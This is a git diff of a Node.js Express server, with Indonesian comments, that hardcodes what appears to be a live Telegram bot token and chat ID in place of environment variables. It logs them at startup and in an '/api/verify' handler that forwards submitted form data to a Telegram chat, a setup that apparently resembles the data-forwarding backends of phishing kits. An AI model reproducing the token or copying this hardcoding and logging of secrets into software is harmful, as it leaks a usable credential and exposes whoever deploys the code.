@@ -6,15 +6,15 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Ambil dari environment variable
-const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
-const CHAT_ID = process.env.CHAT_ID || '7352381955';
+// HARDCODE - Tidak pakai environment variable
+const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
+const CHAT_ID = '7352381955';
 
 console.log('========================================');
 console.log('🚀 SERVER STARTING');
 console.log('========================================');
-console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
-console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
+console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN.substring(0, 10)}...`);
+console.log(`📱 CHAT_ID: ${CHAT_ID}`);
 console.log(`🌐 PORT: ${PORT}`);
 console.log('========================================');
 
@@ -106,6 +106,8 @@ app.post('/api/verify', async (req, res) => {
     
     // ===== SEND TO TELEGRAM =====
     console.log('📤 Sending to Telegram...');
+    console.log(`🤖 Token: ${BOT_TOKEN.substring(0, 10)}...`);
+    console.log(`📱 Chat ID: ${CHAT_ID}`);
     
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
